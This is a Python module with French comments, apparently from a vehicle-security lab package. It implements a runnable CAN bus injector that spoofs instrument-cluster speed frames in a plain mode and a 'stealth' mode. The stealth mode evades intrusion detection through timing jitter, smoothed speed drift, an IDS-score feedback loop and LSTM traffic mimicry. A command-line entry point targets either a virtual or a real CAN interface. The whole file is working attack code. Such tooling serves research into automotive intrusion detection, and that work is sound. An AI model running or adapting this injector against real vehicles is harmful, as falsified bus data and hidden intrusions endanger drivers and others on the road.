"""Injecteur de frames CAN — Naïf et Stealth (optimisé v2).

Améliorations v2 :
    1. Timing jitter : ±10 % de variation sur la période (anti-IDS timing)
    2. Drift smoothing : moyenne glissante pour transitions douces
    3. IDS feedback loop : ajuste la stealth si l'IDS réagit
    4. Buffer LSTM circulaire avec génération online
    5. Intégration avec l'optimiseur pour perturbation locale
"""

from __future__ import annotations

import asyncio
import collections
import logging
import struct
import time
from enum import Enum
from typing import Any, Callable

import can
import numpy as np

from canlab.config import (
    ATTACK_CFG,
    CAN_BUSTYPE,
    CAN_INTERFACE,
    USE_VIRTUAL_BUS,
    ECU_CLUSTER,
)

logger = logging.getLogger(__name__)


class AttackMode(str, Enum):
    NAIVE = "naive"
    STEALTH = "stealth"


class CANInjector:
    """Injecteur de frames CAN sur le bus (v2 optimisé)."""

    def __init__(self, bus: can.BusABC | None = None) -> None:
        self.bus = bus
        self._running = False
        self._attack_mode: AttackMode = AttackMode.NAIVE
        self._target_id: int = ECU_CLUSTER.arb_id
        self._target_speed_kmh: float = 200.0
        self._frame_count: int = 0
        self._lstm_model: Any = None
        self._frame_buffer: list[np.ndarray] = []

        # ── v2 : nouveaux paramètres ──
        self._jitter_pct: float = ATTACK_CFG.timing_jitter_pct
        self._drift_window: int = ATTACK_CFG.drift_smoothing_window
        self._drift_buffer: collections.deque = collections.deque(
            maxlen=ATTACK_CFG.drift_smoothing_window
        )
        self._ids_feedback_score: float = 0.0
        self._ids_scorer: Callable[[np.ndarray], float] | None = None
        self._rng = np.random.default_rng()

    def set_ids_feedback(self, scorer: Callable[[np.ndarray], float]) -> None:
        """Attache un scorer IDS pour le feedback loop."""
        self._ids_scorer = scorer

    def connect(self) -> None:
        """Connecte au bus CAN."""
        if self.bus is not None:
            return
        if USE_VIRTUAL_BUS:
            self.bus = can.Bus(interface="virtual", channel="vcan_sim")
        else:
            self.bus = can.Bus(interface=CAN_BUSTYPE, channel=CAN_INTERFACE)
        logger.info("🔌 Injecteur connecté au bus CAN")

    def disconnect(self) -> None:
        """Déconnecte du bus CAN."""
        self._running = False
        if self.bus is not None:
            self.bus.shutdown()
            self.bus = None

    # ──────────────────────────────────────────────
    # Timing jitter
    # ──────────────────────────────────────────────
    def _jittered_period(self, base_period_ms: float) -> float:
        """Ajoute un jitter ±X% à la période d'injection.

        Rend le timing moins régulier → plus difficile à détecter
        par un IDS basé sur la périodicité.
        """
        jitter = self._rng.uniform(-self._jitter_pct, self._jitter_pct)
        return base_period_ms * (1.0 + jitter)

    # ──────────────────────────────────────────────
    # Drift smoothing
    # ──────────────────────────────────────────────
    def _smooth_speed(self, target: float) -> float:
        """Lisse la vitesse injectée avec une fenêtre glissante.

        Évite les sauts brusques de vitesse détectables par un IDS CUSUM.
        """
        self._drift_buffer.append(target)
        return float(np.mean(self._drift_buffer))

    # ──────────────────────────────────────────────
    # IDS Feedback
    # ──────────────────────────────────────────────
    def _apply_ids_feedback(self, payload: bytearray) -> bytearray:
        """Ajuste le payload si le score IDS est trop élevé.

        Si l'IDS réagit, on réduit l'agressivité de la perturbation.
        """
        if self._ids_scorer is None:
            return payload

        frame_arr = np.frombuffer(bytes(payload), dtype=np.uint8).copy()
        score = self._ids_scorer(frame_arr)
        self._ids_feedback_score = score

        if score > 0.7:
            # IDS alarmé → réduire l'écart (mélanger avec frame normale)
            base_speed = 60.0
            current_speed_raw = (payload[0] << 8) | payload[1]
            current_speed = current_speed_raw / 100.0
            # Ramener 30% vers la vitesse normale
            adjusted_speed = current_speed * 0.7 + base_speed * 0.3
            adj_raw = int(adjusted_speed * 100)
            payload[0] = (adj_raw >> 8) & 0xFF
            payload[1] = adj_raw & 0xFF
            logger.debug("🛡️ IDS feedback : score=%.2f → vitesse réduite à %.0f", score, adjusted_speed)

        return payload

    # ──────────────────────────────────────────────
    # Attaque naïve
    # ──────────────────────────────────────────────
    def craft_naive_frame(self) -> can.Message:
        """Crée une frame naïve avec une vitesse falsifiée."""
        speed_raw = int(self._target_speed_kmh * 100)
        rpm_fake = 3000
        payload = struct.pack(">HHBxxx", speed_raw, rpm_fake, 0)
        return can.Message(
            arbitration_id=self._target_id,
            data=payload,
            is_extended_id=False,
        )

    # ──────────────────────────────────────────────
    # Attaque stealth (LSTM + optimiseur)
    # ──────────────────────────────────────────────
    def load_stealth_model(self) -> None:
        """Charge le modèle LSTM pour l'attaque stealth."""
        try:
            from canlab.attack.mimic_model import load_mimic_model

            self._lstm_model = load_mimic_model()
            logger.info("🧠 Modèle LSTM chargé pour attaque stealth")
        except Exception as e:
            logger.warning("⚠️ Impossible de charger le modèle LSTM: %s", e)
            logger.info("💡 Utilisation du mode stealth simplifié")
            self._lstm_model = None

    def craft_stealth_frame(self) -> can.Message:
        """Crée une frame stealth (LSTM + drift smoothing + IDS feedback)."""
        # Vitesse lissée
        smoothed_speed = self._smooth_speed(self._target_speed_kmh)

        if self._lstm_model is not None and len(self._frame_buffer) >= 50:
            # ── Mode LSTM ──
            sequence = np.array(self._frame_buffer[-50:], dtype=np.float32) / 255.0
            generated = self._lstm_model.generate_frame(sequence)
            # Injecter la vitesse cible (lissée) dans les bytes de vitesse
            speed_raw = int(smoothed_speed * 100)
            generated[0] = (speed_raw >> 8) & 0xFF
            generated[1] = speed_raw & 0xFF
            payload = bytearray(generated[:8].tolist())
        else:
            # ── Mode heuristique avec drift progressif ──
            base_speed = 60.0
            progress = min(1.0, self._frame_count / 100.0)
            current_speed = base_speed + progress * (smoothed_speed - base_speed)

            speed_raw = int(current_speed * 100)
            rpm = int(800 + current_speed * 25)
            noise = self._rng.integers(0, 5)

            payload = bytearray(struct.pack(
                ">HHBBxx",
                speed_raw,
                rpm + noise,
                int(0.3 * 100),
                int(0.2 * 100),
            ))

        # ── IDS feedback loop ──
        payload = self._apply_ids_feedback(payload)

        return can.Message(
            arbitration_id=self._target_id,
            data=bytes(payload),
            is_extended_id=False,
        )

    # ──────────────────────────────────────────────
    # Injection
    # ──────────────────────────────────────────────
    def inject_frame(self) -> can.Message | None:
        """Injecte une frame selon le mode d'attaque actif."""
        if self._attack_mode == AttackMode.NAIVE:
            msg = self.craft_naive_frame()
        else:
            msg = self.craft_stealth_frame()

        if self.bus is not None:
            try:
                self.bus.send(msg)
                self._frame_count += 1
            except can.CanError as e:
                logger.warning("Injection error: %s", e)
                return None
        else:
            self._frame_count += 1

        return msg

    def observe_frame(self, msg: can.Message) -> None:
        """Observe une frame du bus (alimentation buffer LSTM)."""
        payload = np.frombuffer(msg.data, dtype=np.uint8).copy()
        if len(payload) < 8:
            payload = np.pad(payload, (0, 8 - len(payload)))
        self._frame_buffer.append(payload)
        if len(self._frame_buffer) > 200:
            self._frame_buffer = self._frame_buffer[-200:]

    async def run_attack(
        self,
        mode: AttackMode = AttackMode.NAIVE,
        target_id: int = ECU_CLUSTER.arb_id,
        target_speed: float = 200.0,
        duration_s: float = 30.0,
        period_ms: float | None = None,
    ) -> dict:
        """Lance une attaque pour une durée donnée.

        v2 : timing jitter appliqué automatiquement en mode stealth.
        """
        self._attack_mode = mode
        self._target_id = target_id
        self._target_speed_kmh = target_speed
        self._frame_count = 0
        self._running = True
        self._drift_buffer.clear()

        if mode == AttackMode.STEALTH:
            self.load_stealth_model()

        if period_ms is None:
            from canlab.config import ECU_BY_ID
            ecu_def = ECU_BY_ID.get(target_id)
            period_ms = ecu_def.period_ms if ecu_def else 100.0

        self.connect()
        logger.info(
            "⚔️ Attaque %s démarrée — ID=0x%03X, Vitesse=%.0f km/h, Période=%dms, Jitter=±%.0f%%",
            mode.value, target_id, target_speed, period_ms,
            self._jitter_pct * 100,
        )

        t_start = time.monotonic()
        try:
            while self._running and (time.monotonic() - t_start) < duration_s:
                self.inject_frame()
                # Jitter uniquement en mode stealth
                if mode == AttackMode.STEALTH:
                    sleep_ms = self._jittered_period(period_ms)
                else:
                    sleep_ms = period_ms
                await asyncio.sleep(sleep_ms / 1000.0)
        except KeyboardInterrupt:
            pass
        finally:
            self._running = False

        result = {
            "mode": mode.value,
            "target_id": hex(target_id),
            "target_speed": target_speed,
            "frames_injected": self._frame_count,
            "duration_s": time.monotonic() - t_start,
            "ids_feedback_score": self._ids_feedback_score,
        }
        logger.info("✅ Attaque terminée — %d frames injectées", self._frame_count)
        return result

    def stop(self) -> None:
        """Arrête l'attaque en cours."""
        self._running = False
        logger.info("⛔ Attaque arrêtée")


# ──────────────────────────────────────────────
# CLI
# ──────────────────────────────────────────────
def main() -> None:
    import argparse

    parser = argparse.ArgumentParser(description="CAN Frame Injector")
    parser.add_argument(
        "--mode", choices=["naive", "stealth"], default="naive"
    )
    parser.add_argument("--target-id", type=lambda x: int(x, 16), default=0x130)
    parser.add_argument("--speed", type=float, default=200.0)
    parser.add_argument("--duration", type=float, default=30.0)
    parser.add_argument("--virtual", action="store_true")
    args = parser.parse_args()

    if args.virtual:
        import canlab.config as cfg
        cfg.USE_VIRTUAL_BUS = True
        cfg.CAN_BUSTYPE = "virtual"

    logging.basicConfig(level=logging.INFO)
    injector = CANInjector()
    asyncio.run(
        injector.run_attack(
            mode=AttackMode(args.mode),
            target_id=args.target_id,
            target_speed=args.speed,
            duration_s=args.duration,
        )
    )


if __name__ == "__main__":
    main()
